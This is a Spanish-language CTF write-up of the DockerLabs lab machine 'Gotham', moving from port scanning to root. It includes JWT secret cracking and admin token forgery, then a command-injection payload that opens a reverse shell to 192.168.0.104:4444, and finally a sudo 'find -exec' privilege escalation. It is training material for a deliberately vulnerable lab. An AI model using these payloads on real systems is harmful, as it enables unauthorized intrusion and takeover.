# 🧠 Informe de Pentesting – Máquina: Gotham

### 💡 Dificultad: Fácil

📦 **Plataforma:** DockerLabs

![Despliegue](Imagenes/logo.png)

---

# 🚀 Despliegue de la Máquina

Para iniciar la máquina vulnerable, primero descomprimimos el archivo proporcionado y posteriormente ejecutamos el script de despliegue:

```bash
unzip gotham.zip
sudo bash auto_deploy.sh gotham.tar
```

Una vez finalizado el proceso, el contenedor vulnerable quedará desplegado dentro de nuestro entorno de laboratorio y listo para comenzar las tareas de reconocimiento y explotación.

![Despliegue](Imagenes/despliegue.png)

---

# 📶 Comprobación de Conectividad

Después del despliegue, verificamos que la máquina objetivo se encuentre activa y responda correctamente a peticiones ICMP:

```bash
ping -c1 172.17.0.2
```

La respuesta recibida confirma que el host está encendido y accesible dentro de la red local del laboratorio.

![Despliegue](Imagenes/ping.png)

---

# 🔍 Escaneo de Puertos

El siguiente paso consiste en realizar un escaneo completo sobre todos los puertos TCP con el objetivo de identificar los servicios expuestos por la máquina víctima.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### Explicación de los parámetros utilizados

| Parámetro         | Descripción                                    |
| ----------------- | ---------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP.                 |
| `--open`          | Muestra únicamente los puertos abiertos.       |
| `-sS`             | Realiza un SYN Scan (escaneo semiabierto).     |
| `--min-rate 5000` | Envía al menos 5000 paquetes por segundo.      |
| `-vvv`            | Incrementa el nivel de verbosidad.             |
| `-n`              | Evita la resolución DNS.                       |
| `-Pn`             | Omite la fase de descubrimiento mediante ping. |

### 📌 Puertos Abiertos Detectados

Durante el análisis se identificaron los siguientes puertos abiertos:

* **22/tcp** → Servicio SSH
* **80/tcp** → Servicio HTTP

![Despliegue](Imagenes/nmapuno.png)

---

## 🧩 Enumeración de Servicios y Versiones

Una vez identificados los puertos abiertos, realizamos una enumeración más detallada para conocer versiones, configuraciones y posibles vectores de ataque.

```bash
nmap -sCV -p22,80,3306 172.17.0.2
```

### Explicación de los parámetros

| Parámetro | Descripción                                |
| --------- | ------------------------------------------ |
| `-sC`     | Ejecuta scripts NSE por defecto.           |
| `-sV`     | Detecta versiones de servicios.            |
| `-p`      | Define los puertos específicos a analizar. |

Este análisis permite recopilar información relevante sobre los servicios activos y posibles configuraciones inseguras.

![Despliegue](Imagenes/nmapdos.png)

---

# Revisión de la Página HTTP

Al identificar la existencia del servicio HTTP, accedemos mediante el navegador web:

```bash
http://172.17.0.2
```

Al ingresar, encontramos un formulario de inicio de sesión. Se realizaron pruebas de inyección SQL y se intentó el uso de credenciales por defecto, pero ninguna de estas técnicas tuvo éxito.

![Despliegue](Imagenes/pagina.png)

---

# Realización de Fuzzing

Se realizó un proceso de fuzzing de directorios con el objetivo de identificar posibles vectores de ataque. Como resultado, se descubrieron las siguientes rutas:

```text
/index.php
/admin.php
/config.php
/robots.txt
/dashboard.php
```

Sin embargo, en un primer análisis no se identificó ninguna oportunidad evidente de explotación.

![Despliegue](Imagenes/gobuster.png)

Posteriormente, se revisó el código fuente de la aplicación y se encontraron credenciales embebidas:

```text
guest:guest
```

![Despliegue](Imagenes/credencialespagina.png)

Al introducir dichas credenciales se logró acceder al panel de la aplicación.

![Despliegue](Imagenes/dashboadradmin.png)

Al revisar la interfaz se observa que hemos iniciado sesión como el usuario **guest**, cuyo rol es **user**. Sin embargo, para acceder al centro de operaciones de red es necesario contar con privilegios de **admin**.

---

# Análisis de la Gestión de Sesiones

Se utilizó Burp Suite para interceptar las peticiones. Después de cerrar sesión e iniciar nuevamente con las credenciales `guest:guest`, se capturó la siguiente cookie:

```bash
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDQ2N30.YGu576Av-l0sYX3IsuYOmNjl9VoMCJ9EBBaAnC2E6YQ
```

La cadena comienza con `eyJ...`, un patrón característico de los **JSON Web Tokens (JWT)**.

Un JWT se compone de tres secciones separadas por puntos (`.`):

1. Header (Cabecera)
2. Payload (Carga útil)
3. Signature (Firma)

![Despliegue](Imagenes/burtsuitesession.png)

Para analizar el contenido del token se utilizó el siguiente procedimiento:

```bash
JWT='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDk1NH0._1H0RI7lON6ajlzBUHZx4SSp_9Fa9BJ7-SJKICyCa20'

echo "$JWT" | awk -F. '{print $1 "\n" $2}' | while read -r part; do
    echo "$part" | base64 --decode --ignore-garbage 2>/dev/null | jq .
done
```

![Despliegue](Imagenes/descodificargolpe.png)

El resultado confirma que el token contiene la información del usuario y su rol. Para modificar los valores de `user` y `role` es necesario conocer la clave secreta utilizada para firmar el JWT.

---

# Obtención de la Secret Key

Primero guardamos el token en un archivo:

```bash
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDQ2N30.YGu576Av-l0sYX3IsuYOmNjl9VoMCJ9EBBaAnC2E6YQ" > token.txt
```

Posteriormente se utilizó John the Ripper para intentar recuperar la clave de firma mediante fuerza bruta basada en diccionario:

```bash
john token.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
```

La clave fue recuperada con éxito:

```text
batman
```

![Despliegue](Imagenes/tokenbatman.png)

---

# Creación de un JWT con Privilegios de Administrador

Una vez conocida la clave secreta, podemos generar un nuevo token modificando los campos `user` y `role`.

## 1. Definir la cabecera y el payload

```bash
HEADER='{"typ":"JWT","alg":"HS256"}'
PAYLOAD='{"user":"admin","role":"admin","iat":1781480954}'
```

## 2. Crear una función Base64URL

```bash
b64url() {
    echo -n "$1" | base64 | tr -d '=' | tr '/+' '_-'
}
```

## 3. Codificar cabecera y payload

```bash
HEADER_B64=$(b64url "$HEADER")
PAYLOAD_B64=$(b64url "$PAYLOAD")
```

## 4. Construir los datos a firmar

```bash
DATA_TO_SIGN="${HEADER_B64}.${PAYLOAD_B64}"
```

## 5. Generar la firma HMAC-SHA256 utilizando la clave recuperada

```bash
SIGNATURE_B64=$(echo -n "$DATA_TO_SIGN" | openssl dgst -sha256 -hmac "batman" -binary | base64 | tr -d '=' | tr '/+' '_-')
```

## 6. Construir el JWT final

```bash
FINAL_JWT="${DATA_TO_SIGN}.${SIGNATURE_B64}"
```

## 7. Mostrar el resultado

```bash
echo "$FINAL_JWT"
```

![Despliegue](Imagenes/generartokenadmin.png)

---

# Validación del Token Manipulado

Antes de modificar la cookie en el navegador, se verificó su funcionamiento utilizando Burp Suite.

Se reemplazó completamente el valor de la cookie `session` por el nuevo token generado y se reenviaron las peticiones al servidor. La modificación fue exitosa y se obtuvo acceso con privilegios de administrador.

![Despliegue](Imagenes/gobusteradmin.png)

Anteriormente se había identificado el recurso `/admin.php`. Aprovechando el nuevo token, se modificó la petición HTTP para acceder directamente a dicho recurso.

La respuesta confirmó que el acceso era válido y que los privilegios administrativos estaban activos.

![Despliegue](Imagenes/adminphpsession.png)

Posteriormente se replicó el procedimiento directamente desde el navegador:

1. Abrir las herramientas de desarrollador.
2. Acceder a la sección **Storage**.
3. Seleccionar **Cookies**.
4. Localizar la cookie `session`.
5. Sustituir el valor por el nuevo JWT.
6. Confirmar los cambios.
7. Acceder a `/admin.php`.

Tras realizar estos pasos, la aplicación redirigió correctamente al panel administrativo.

![Despliegue](Imagenes/ejecutar.png)

---

# Identificación de Command Injection

La nueva página administrativa presenta una utilidad denominada **Connectivity Check Utility**, que permite introducir una dirección IP o nombre de host para realizar comprobaciones de conectividad.

Este tipo de funcionalidades suele ser un objetivo habitual para ataques de inyección de comandos, ya que frecuentemente ejecutan comandos del sistema operativo en segundo plano.

Después de múltiples pruebas y análisis de los mensajes de error devueltos por la aplicación, se confirmó que era posible utilizar el carácter:

```bash
;
```

El punto y coma permite ejecutar un segundo comando independientemente del resultado del primero. En este escenario, primero se ejecutaría el comando legítimo de comprobación de conectividad y, posteriormente, el comando inyectado.

![Despliegue](Imagenes/pruebauno.png)

---

# Obtención de Reverse Shell

En la máquina atacante se configuró un listener:

```bash
sudo nc -lvnp 4444
```

Posteriormente se introdujo el siguiente payload en el formulario vulnerable:

```bash
127.0.0.1 ; bash -c "bash -i >& /dev/tcp/192.168.0.104/4444 0>&1"
```

![Despliegue](Imagenes/payload.png)

La ejecución fue exitosa y se obtuvo una reverse shell sobre el sistema objetivo.

![Despliegue](Imagenes/acceso.png)

Una vez obtenida la shell interactiva, se realizó el tratamiento TTY correspondiente para mejorar la estabilidad y funcionalidad de la sesión.

---

# Enumeración Local

Durante la enumeración del sistema se identificó el usuario:

```text
bruce
```

ubicado dentro del directorio:

```text
/home
```

![Despliegue](Imagenes/usuario.png)

Posteriormente se revisó el contenido de:

```text
/var/www/html
```

donde se encontró el archivo:

```text
config.php
```

En dicho archivo se confirmó que la clave JWT era:

```text
batman
```

Además, se localizaron credenciales de acceso a la base de datos:

```text
gothamdb:Arkh4m_Kn1ght
```

![Despliegue](Imagenes/confirmacontraseña.png)

Se probó la reutilización de la contraseña encontrada sobre el usuario local identificado anteriormente:

```bash
su bruce
```

Contraseña:

```text
Arkh4m_Kn1ght
```

El acceso fue exitoso.

---

# Escalada de Privilegios

Se procedió a verificar los privilegios sudo asignados al usuario y a buscar posibles vectores de escalada.

Durante la enumeración se detectó una configuración insegura relacionada con el binario `find`.

## Explicación de la Vulnerabilidad

El archivo `/etc/sudoers` contiene una regla que permite al usuario **bruce** ejecutar el binario:

```bash
/usr/bin/find
```

como usuario **root** y sin necesidad de proporcionar contraseña (`NOPASSWD`).

Aunque `find` está diseñado para buscar archivos, incorpora la opción:

```bash
-exec
```

la cual permite ejecutar comandos arbitrarios del sistema operativo.

Debido a que el binario puede ejecutarse mediante sudo, cualquier comando invocado mediante `-exec` heredará privilegios de root.

---

# Abuso de GTFOBins

GTFOBins es un catálogo ampliamente reconocido dentro del ámbito de la seguridad ofensiva que documenta técnicas para abusar de binarios legítimos cuando se ejecutan con privilegios elevados.

Para obtener una shell privilegiada se utilizó:

```bash
sudo find . -exec /bin/bash -p \; -quit
```

### Desglose del comando

**sudo find .**

Ejecuta `find` con privilegios de root comenzando la búsqueda desde el directorio actual.

**-exec /bin/bash -p**

Indica a `find` que ejecute una instancia de Bash. El parámetro `-p` es fundamental, ya que evita que Bash descarte los privilegios heredados y conserva el UID efectivo de root.

**;**

Delimitador obligatorio que marca el final del comando ejecutado por `find`.

**-quit**

Detiene la ejecución inmediatamente después de la primera coincidencia, evitando la creación de múltiples shells.

Como resultado, se obtuvo una shell con privilegios de administrador del sistema.

![Despliegue](Imagenes/root.png)
